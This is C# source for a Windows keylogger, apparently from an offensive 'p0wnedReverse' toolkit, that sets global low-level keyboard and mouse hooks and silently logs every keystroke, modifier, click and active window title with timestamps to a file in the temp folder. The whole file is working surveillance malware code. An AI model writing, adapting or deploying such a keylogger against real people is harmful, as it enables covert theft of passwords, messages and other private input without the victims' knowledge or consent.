using System;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO;
using System.Globalization;

namespace p0wnedReverse
{
    class KeyLogger
    {

        private const int WH_KEYBOARD_LL = 13;
        private const int WH_MOUSE_LL = 14;
        private static LowLevelKeyboardProc _prock = HookCallbackK;
        private static LowLevelMouseProc _procm = HookCallbackM;
        private static IntPtr _hookKID = IntPtr.Zero;
        private static IntPtr _hookMID = IntPtr.Zero;
        private static string window = "";
        private static KeysConverter keysConverter = new KeysConverter();
        private static Boolean CtrlDown = false;
        private static Boolean AltDown = false;
        private static Boolean ShiftDown = false;
        private static Boolean WinDown = false;
        private static string keyLogFile = Path.GetTempPath() + "Keylog-" + string.Format("{0:yyyy-MM-dd-HHmm}", DateTime.Now) + ".txt";
        const int KL_NAMELENGTH = 9;

        public class User32
        {
            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelMouseProc lpfn, IntPtr hMod, uint dwThreadId);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool UnhookWindowsHookEx(IntPtr hhk);

            [DllImport("user32.dll")]
            public static extern IntPtr GetForegroundWindow();

            [DllImport("user32.dll")]
            public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

            [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
            public static extern short GetKeyState(int keyCode);

            [DllImport("user32.dll")]
            public static extern long GetKeyboardLayoutName(System.Text.StringBuilder pwszKLID);
        }

        public class Kernel32
        {
            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern IntPtr GetModuleHandle(string lpModuleName);

        }

        enum MouseMessages
        {
            WM_LBUTTONDOWN = 0x0201,
            WM_LBUTTONUP = 0x0202,
            WM_MOUSEMOVE = 0x0200,
            WM_MOUSEWHEEL = 0x020A,
            WM_RBUTTONDOWN = 0x0204,
            WM_RBUTTONUP = 0x0205
        }

        enum KeyboardMessages
        {
            WM_SYSKEYDOWN = 0x0104,
            WM_SYSKEYUP = 0x0105,
            WM_KEYDOWN = 0x0100,
            WM_KEYUP = 0x0101
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct POINT
        {
            public int x;
            public int y;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct MSLLHOOKSTRUCT
        {
            public POINT pt;
            public uint mouseData;
            public uint flags;
            public uint time;
            public IntPtr dwExtraInfo;
        }

        public static void startKeylogger()
        {
            //write current state to file
            bool CapsLock = (((ushort)User32.GetKeyState(0x14)) & 0xffff) != 0;
            bool NumLock = (((ushort)User32.GetKeyState(0x90)) & 0xffff) != 0;
            bool ScrollLock = (((ushort)User32.GetKeyState(0x91)) & 0xffff) != 0;
            writeToFile("Capslock = " + CapsLock + "\r\n");
            writeToFile("NumLock = " + NumLock + "\r\n");
            writeToFile("ScrollLock = " + ScrollLock + "\r\n");

            StringBuilder lcid = new StringBuilder(KL_NAMELENGTH);
            User32.GetKeyboardLayoutName(lcid);
            string keyboardName = InputLanguage.CurrentInputLanguage.LayoutName;
            writeToFile("Keyboard layout = " + lcid.ToString() + " (" + keyboardName + ")\r\n");

            _hookKID = SetHookK(_prock);
            _hookMID = SetHookM(_procm);
            Application.Run();
            User32.UnhookWindowsHookEx(_hookKID);
            User32.UnhookWindowsHookEx(_hookMID);
        }

        private static String KeyToString(Keys key)
        {
            switch (key)
            {
                case Keys.Control:
                case Keys.ControlKey:
                case Keys.LControlKey:
                case Keys.RControlKey:
                    return "[Ctrl]";
                case Keys.Alt:
                case Keys.Menu:
                case Keys.LMenu:
                case Keys.RMenu:
                    return "[Alt]";
                case Keys.Shift:
                case Keys.ShiftKey:
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                    return "[Shift]";
                case Keys.LWin:
                case Keys.RWin:
                    return "[Win]";
                case Keys.Decimal:
                case Keys.OemPeriod:
                    return ".";
                case Keys.Divide:
                case Keys.OemQuestion:
                    return "/";
                case Keys.Multiply:
                    return "*";
                case Keys.OemBackslash:
                    return "\\";
                case Keys.OemCloseBrackets:
                    return "]";
                case Keys.OemMinus:
                case Keys.Separator:
                    return "-";
                case Keys.OemOpenBrackets:
                    return "[";
                case Keys.OemPipe:
                    return "|";
                case Keys.OemQuotes:
                    return "\"";
                case Keys.OemSemicolon:
                    return ";";
                case Keys.Oemcomma:
                    return ",";
                case Keys.Oemplus:
                    return "=";
                case Keys.Oemtilde:
                    return "` (~)";
                case Keys.Capital:
                    return "[CapsLock]";
                case Keys.Scroll:
                    return "[ScrollLock]";
                case Keys.NumLock:
                    return "[NumLock]";
                case Keys.Add:
                    return "[NumPad+]";
                case Keys.Subtract:
                    return "[NumPad-]";
                case Keys.NumPad0:
                    return "[NumPad0]";
                case Keys.NumPad1:
                    return "[NumPad1]";
                case Keys.NumPad2:
                    return "[NumPad2]";
                case Keys.NumPad3:
                    return "[NumPad3]";
                case Keys.NumPad4:
                    return "[NumPad4]";
                case Keys.NumPad5:
                    return "[NumPad5]";
                case Keys.NumPad6:
                    return "[NumPad6]";
                case Keys.NumPad7:
                    return "[NumPad7]";
                case Keys.NumPad8:
                    return "[NumPad8]";
                case Keys.NumPad9:
                    return "[NumPad9]";
                case Keys.D0:
                    return "0";
                case Keys.D1:
                    return "1";
                case Keys.D2:
                    return "2";
                case Keys.D3:
                    return "3";
                case Keys.D4:
                    return "4";
                case Keys.D5:
                    return "5";
                case Keys.D6:
                    return "6";
                case Keys.D7:
                    return "7";
                case Keys.D8:
                    return "8";
                case Keys.D9:
                    return "9";
                case Keys.Space:
                    return " ";
                case Keys.F1:
                    return "[F1]";
                case Keys.F2:
                    return "[F2]";
                case Keys.F3:
                    return "[F3]";
                case Keys.F4:
                    return "[F4]";
                case Keys.F5:
                    return "[F5]";
                case Keys.F6:
                    return "[F6]";
                case Keys.F7:
                    return "[F7]";
                case Keys.F8:
                    return "[F8]";
                case Keys.F9:
                    return "[F9]";
                case Keys.F10:
                    return "[F10]";
                case Keys.F11:
                    return "[F11]";
                case Keys.F12:
                    return "[F12]";
                case Keys.PrintScreen:
                    return "[PrintScreen]";
                case Keys.Pause:
                    return "[Pause]";
                case Keys.Back:
                    return "[Backspace]";
                case Keys.Insert:
                    return "[Insert]";
                case Keys.Delete:
                    return "[Delete]";
                case Keys.PageUp:
                    return "[PageUp]";
                case Keys.PageDown:
                    return "[PageDown]";
                case Keys.End:
                    return "[End]";
                case Keys.Home:
                    return "[Home]";
                case Keys.MediaNextTrack:
                    return "[MediaNextTrack]";
                case Keys.MediaPreviousTrack:
                    return "[MediaPreviousTrack]";
                case Keys.MediaPlayPause:
                    return "[MediaPlayPause]";
                case Keys.MediaStop:
                    return "[MediaStop]";
                case Keys.SelectMedia:
                    return "[SelectMedia]";
                case Keys.Apps:
                    return "[Apps]";
                case Keys.Up:
                    return "[Up]";
                case Keys.Down:
                    return "[Down]";
                case Keys.Left:
                    return "[Left]";
                case Keys.Right:
                    return "[Right]";
                default:
                    try
                    { //string was not one of the defined methods, so try using the key converter
                        string value = keysConverter.ConvertToString(key);
                        if (value.Length == 1) //value is a single letter
                            value = value.ToLower(); //make it lowercase
                        return value;
                    }
                    catch
                    { //key converter failed, so return null
                        return null;
                    }
            }
        }

        //combo key detector function
        private static Boolean isComboKey(Keys key)
        {
            switch (key)
            {
                case Keys.Control:
                case Keys.ControlKey:
                case Keys.LControlKey:
                case Keys.RControlKey:
                case Keys.Shift:
                case Keys.ShiftKey:
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                case Keys.Alt:
                case Keys.Menu:
                case Keys.LMenu:
                case Keys.RMenu:
                case Keys.LWin:
                case Keys.RWin:
                case Keys.None:
                    return true; //combo key
                default:
                    return false; //not a combo key
            }
        }

        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        public delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr SetHookK(LowLevelKeyboardProc prock)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return User32.SetWindowsHookEx(WH_KEYBOARD_LL, prock, Kernel32.GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr SetHookM(LowLevelMouseProc procm)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return User32.SetWindowsHookEx(WH_MOUSE_LL, procm, Kernel32.GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        //keyboard hook
        private static IntPtr HookCallbackK(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                bool gotCombo = false;
                //capturing combokey
                if (wParam == (IntPtr)KeyboardMessages.WM_KEYDOWN || wParam == (IntPtr)KeyboardMessages.WM_KEYUP)
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    if (isComboKey((Keys)vkCode))
                    {
                        if (KeyToString((Keys)vkCode) == "[Shift]")
                        {
                            if (ShiftDown == false)
                            {
                                ShiftDown = true;
                                writeToFile("[ShiftDown]");
                            }
                            else if (wParam == (IntPtr)KeyboardMessages.WM_KEYUP)
                            {
                                ShiftDown = false;
                                writeToFile("[ShiftUp]");
                            }
                        }
                        else if (KeyToString((Keys)vkCode) == "[Alt]")
                        {
                            if (AltDown == false)
                            {
                                AltDown = true;
                                writeToFile("[AltDown]");
                            }
                            else if (wParam == (IntPtr)KeyboardMessages.WM_KEYUP)
                            {
                                AltDown = false;
                                writeToFile("[AltUp]");
                            }
                        }
                        else if (KeyToString((Keys)vkCode) == "[Ctrl]")
                        {
                            if (CtrlDown == false)
                            {
                                CtrlDown = true;
                                writeToFile("[CtrlDown]");
                            }
                            else if (wParam == (IntPtr)KeyboardMessages.WM_KEYUP)
                            {
                                CtrlDown = false;
                                writeToFile("[CtrlUp]");
                            }
                        }
                        else if (KeyToString((Keys)vkCode) == "[Win]")
                        {
                            if (CtrlDown == false)
                            {
                                WinDown = true;
                                writeToFile("[WinDown]");
                            }
                            else if (wParam == (IntPtr)KeyboardMessages.WM_KEYUP)
                            {
                                WinDown = false;
                                writeToFile("[WinUp]");
                            }
                        }

                        gotCombo = true;
                    }
                }

                if ((wParam == (IntPtr)KeyboardMessages.WM_KEYDOWN || wParam == (IntPtr)KeyboardMessages.WM_SYSKEYDOWN) && gotCombo == false)
                {
                    checkCurrentWindow();
                    int vkCode = Marshal.ReadInt32(lParam);
                    writeToFile(KeyToString((Keys)vkCode));

                }
            }
            return User32.CallNextHookEx(_hookKID, nCode, wParam, lParam);
        }

        //mouse hook
        private static IntPtr HookCallbackM(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam != (IntPtr)MouseMessages.WM_MOUSEMOVE && wParam != (IntPtr)MouseMessages.WM_MOUSEWHEEL)
            {
                checkCurrentWindow();

                MSLLHOOKSTRUCT hookStruct = (MSLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(MSLLHOOKSTRUCT));
                string coords = "(x" + hookStruct.pt.x + "y" + hookStruct.pt.y + ")";

                //Console.WriteLine(coords);

                //get the mouse
                if ((IntPtr)MouseMessages.WM_LBUTTONDOWN == wParam)
                {
                    writeToFile("[Left Button]");
                }
                else if ((IntPtr)MouseMessages.WM_LBUTTONUP == wParam)
                {
                    //nothing
                }
                else if ((IntPtr)MouseMessages.WM_RBUTTONDOWN == wParam)
                {
                    writeToFile("[Right Button]");
                }
                else if ((IntPtr)MouseMessages.WM_RBUTTONUP == wParam)
                {
                    //nothing
                }
                else
                {
                    writeToFile(coords);
                }
            }
            return User32.CallNextHookEx(_hookMID, nCode, wParam, lParam);
        }

        private static string getCurrentWindow()
        {
            IntPtr handle = User32.GetForegroundWindow();
            string currentWindow = "";
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            if (User32.GetWindowText(handle, Buff, nChars) > 0)
            {
                currentWindow = Buff.ToString();
            }
            return currentWindow;
        }

        private static void checkCurrentWindow()
        {
            string currentWindow = getCurrentWindow();
            if (window != currentWindow)
            {
                window = currentWindow;
                writeToFile("\r\n<" + DateTime.Now.ToString() + " | " + window + ">\r\n");
            }
        }

        public static void writeToFile(string toWrite)
        {
            StreamWriter sw = new StreamWriter(keyLogFile, true);
            sw.Write(toWrite);
            sw.Close();
        }

    }
}

